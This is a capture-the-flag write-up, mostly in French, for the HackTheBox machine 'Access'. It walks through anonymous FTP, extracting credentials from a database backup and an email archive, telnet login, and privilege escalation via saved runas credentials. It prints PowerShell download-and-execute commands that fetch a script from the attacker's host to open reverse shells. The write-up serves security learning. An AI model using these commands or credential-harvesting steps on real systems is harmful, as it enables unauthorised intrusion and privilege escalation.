---
title: HTB | Access
description: Access is an easy difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.
slug: access-htb
date: 2025-02-18 00:00:00+0000
#image: cover.png
categories:
    - HackTheBox
tags:
    - Windows
    - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Access cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Access</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.98</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
security : 4Cc3ssC0ntr0ller
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb/Access]
└─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.98
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  syn-ack ttl 127 Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
```

## Foothold

### FTP Anonymous connexion: Gettings 2 files
```bash
┌──(kali㉿kali)-[~/htb/Access/Access Control]
└─$ ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
425 Cannot open data connection.
200 PORT command successful.
150 Opening ASCII mode data connection.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> cd ../Engineer
250 CWD command successful.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> ^D
221 Goodbye.
```

### backup.mdb and Access Control.zip
En analysant les tables disponibles dans le fichier backup.mdb, on trouve la table "auth_user" qui contient un champs PASSWORD potentiellement intéressant.
```bash
┌──(kali㉿kali)-[~/htb/Access]
└─$ mdb-schema backup.mdb | grep -i PASSWORD -A30 -B30
...
CREATE TABLE [auth_user]
 (
        [id]                    Long Integer, 
        [username]                      Text (50), 
        [password]                      Text (50), 
        [Status]                        Long Integer, 
        [last_login]                    DateTime, 
        [RoleID]                        Long Integer, 
        [Remark]                        Memo/Hyperlink (255)
);
...
```
On extrait la table auth_user et on récupère 3 credentials user/password. 
```bash
┌──(kali㉿kali)-[~/htb/Access]
└─$ mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

En ftp et telnet, aucun ne fonctionne. Cependant, en utilisant le mot de passe "access4u@security" sur le fichier "Access Control.zip", l'archive se décompresse correctement !
```bash
┌──(kali㉿kali)-[~/htb/Access]
└─$ 7z x Access\ Control.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:3 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed): <<<<<<<<<<<<<<<< access4u@security
Everything is Ok

Size:       271360
Compressed: 10870
                                                     
┌──(kali㉿kali)-[~/htb/Access]
└─$ ls               
'Access Control.pst'  'Access Control.zip'   auth_user.txt   backup.mdb
```

### Extracting emails from pst file
```bash
┌──(kali㉿kali)-[~/htb/Access]
└─$ readpst -r Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

### Getting "security" account password from emails
security: `4Cc3ssC0ntr0ller`
```bash
┌──(kali㉿kali)-[~/htb/Access/Access Control]
└─$ cat mbox | grep pass
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
```

### TELNET - security account
```bash
┌──(kali㉿kali)-[~/htb/Access/Access Control]
└─$ telnet 10.10.10.98 23
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security         
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>type Desktop\user.txt
9535.....3f75
```

## Privilege Escalation

### Powershell
Si j'écris simplement "powershell", un powershell semble s'ouvrir mais n'est pas stable. J'ai donc dû ouvrir un reverse shell pour obtenir un powershell stable :

```bash
----------KALI------------

┌──(kali㉿kali)-[~/htb/Access]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.98 - - [16/Feb/2025 17:04:22] "GET /Invoke.ps1 HTTP/1.1" 200 -

----------KALI------------

┌──(kali㉿kali)-[~/htb/Access]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.98] 49165

Windows PowerShell running as user security on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\security>PS C:\Users\security> whoami
access\security


---------WINDOWS----------

C:\Users\security>powershell /C IEX(New-Object Net.WebClient).downloadString('http://10.10.16.9:8888/Invoke.ps1')
```

### ZKAccess.lnk
```bash
PS C:\Users\security> cd ../Public
PS C:\Users\Public> cd Desktop
PS C:\Users\Public\Desktop> ls


    Directory: C:\Users\Public\Desktop


Mode                LastWriteTime     Length Name                                                                                                                                                                                          
----                -------------     ------ ----                                                                                                                                                                                          
-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk                                                                                                                                                               


PS C:\Users\Public\Desktop> cat Z*
L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?▒M?:*wWindowsV1MV?System32???:?▒MV?*?System32▒X2P?:?
                                                                                                           runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
                                                                                                                                                                                                                   ?wN?▒?]N?D.??Q???`?Xaccess?_???8{E?3
           O?j)?H???
                    )??[?_???8{E?3
                                  O?j)?H???
                                           )??[?        ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500
```
En fouillant dans les dossiers, on trouve un fichier ZKAccess.lnk qui semble executer un binaire "Access.exe" avec des droits élévé :
> Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe
On observe l'utilisation de runas, pour executer un fichier en tant qu'un utilisateur spécifique. En l'occurence, ici, il s'agit de l'Administrator (celui qui nous intéresse). Apparement les creds de l'administrateur sont enregistrés, et on peut executer n'importe quelle commande en tant qu'Administrator en utilisant l'argument /savecred.

On tente d'utiliser à nouveau notre script Invoke.ps1 pour ouvrir un reverseshell de type powershell en tant qu'Administrator, et ça fonctionne. On a changé le port dans le Invoke.ps1 bien sûr car le port est déjà utiliser sur la kali pour le powershell actuel.
```bash
PS C:\Users\security> runas /user:ACCESS\Administrator /savecred "powershell /C IEX(New-Object Net.WebClient).downloadString('http://10.10.16.9:8888/Invoke.ps1')"

--------KALI---------

┌──(kali㉿kali)-[~/htb/Access]
└─$ nc -lnvp 1339    
listening on [any] 1339 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.98] 49216
Windows PowerShell running as user Administrator on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
access\administrator
PS C:\Windows\system32> cd C:\Users\Administrator
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-ar--         2/16/2025   6:02 PM         34 root.txt                          


PS C:\Users\Administrator\Desktop> cat root.txt
339f.....e901
```

## Tips
- Toujours fouiller les dossiers des utilisateurs accessibles, avant d'effectuer un **winPEAS**.